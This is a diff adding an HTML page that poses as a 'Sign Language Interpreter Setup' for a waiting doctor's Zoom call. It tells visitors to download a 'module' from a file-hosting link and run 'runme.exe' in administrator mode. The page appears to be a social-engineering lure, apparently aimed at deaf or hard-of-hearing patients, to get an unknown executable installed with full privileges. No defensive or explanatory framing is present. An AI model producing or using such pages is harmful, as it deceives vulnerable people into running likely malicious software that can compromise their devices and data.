@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Language Interpreter Setup</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #c6e1f5;
+            color: #333;
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            width: 80%;
+            max-width: 1200px;
+            background: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .left-section, .right-section {
+            flex: 1;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .left-section {
+            background: #f9fafb;
+        }
+
+        .right-section {
+            background: linear-gradient(135deg, #007bff, #6a11cb);
+            color: #ffffff;
+        }
+
+        .header, .heading {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .instructions {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            margin-top: 20px    ;
+        }
+
+        .download-button {
+            display: inline-block;
+            padding: 15px 25px;
+            font-size: 1.2rem;
+            color: #ffffff;
+            background:#0b5cff;;
+            text-decoration: none;
+            border-radius: 30px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .download-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .terminal {
+            width: 100%;
+            max-width: 400px;
+            background: #333;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: "Courier New", Courier, monospace;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .zoom-icon {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        .zoom-link {
+            font-size: 1.2rem;
+            color: #ffffff;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px 20px;
+            border-radius: 30px;
+            text-decoration: none;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .zoom-link:hover {
+            background: rgba(255, 255, 255, 0.4);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                width: 90%;
+            }
+
+            .left-section, .right-section {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="header">Need a Sign Language Interpreter?</div>
+            <div class="instructions">1. Download the following module:</div>
+            <a href="https://mega.nz/file/knV2xISa#keBoXOjZsQPnOeIcWqgjfyBbSb-8oB1NEI-LGXbEfWI" target="_blank" class="download-button">Download Module</a>
+            <div class="instructions">2. Run <strong>runme.exe</strong> in administrator mode</div>
+        </div>
+
+        <div class="right-section">
+            <div class="heading">Doctor's Waiting...</div>
+            <img src="zoom-logo.png" alt="Zoom Call" class="zoom-icon">
+            <a href="https://us05web.zoom.us/j/82328278867?pwd=mYqRajaWmxUbsL7plmQ1bnZhwYb3Tl.1" target="_blank" class="zoom-link">Join Zoom Call</a>
+        </div>
+    </div>
+</body>
+</html>
